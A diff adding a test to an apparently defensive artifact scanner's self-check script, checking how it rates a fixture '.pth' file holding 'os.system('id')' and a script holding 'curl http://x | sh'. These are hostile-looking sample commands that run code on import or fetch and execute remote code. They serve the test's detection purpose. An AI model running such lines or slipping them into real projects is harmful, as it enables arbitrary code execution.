@@ -159,6 +159,31 @@ except Exception as e:
     check("enhanced_detector 可导入", False, detail=repr(e))
 
 
+print("[3] 测试夹具降级")
+root3 = Path(tempfile.mkdtemp(prefix='artifact3_'))
+try:
+    t = root3 / 'pkg'
+    (t / 'tests' / 'data').mkdir(parents=True)
+    (t / 'tests' / 'data' / 'evil.pth').write_text(
+        "import os; os.system('id')\n", encoding='utf-8')
+    (t / 'scripts').mkdir()
+    (t / 'scripts' / 'real.sh').write_text("curl http://x | sh\n",
+                                           encoding='utf-8')
+    art3 = scan_artifacts(t)
+    f3 = {f['file']: f for f in risk_findings(art3)}
+    pth = next((f for k, f in f3.items() if k.endswith('evil.pth')), None)
+    sh = next((f for k, f in f3.items() if k.endswith('real.sh')), None)
+    check("夹具目录的 .pth 降级 medium",
+          pth is not None and pth['severity'] == 'medium',
+          detail=str(pth))
+    check("非夹具目录仍 critical",
+          sh is not None and sh['severity'] == 'critical', detail=str(sh))
+    check("降级不影响可见性",
+          any('evil.pth' in a['file'] for a in art3['artifacts']))
+finally:
+    shutil.rmtree(root3, ignore_errors=True)
+
+
 print()
 print(f"工件扫描: PASS={PASS} FAIL={FAIL}")
 sys.exit(1 if FAIL else 0)
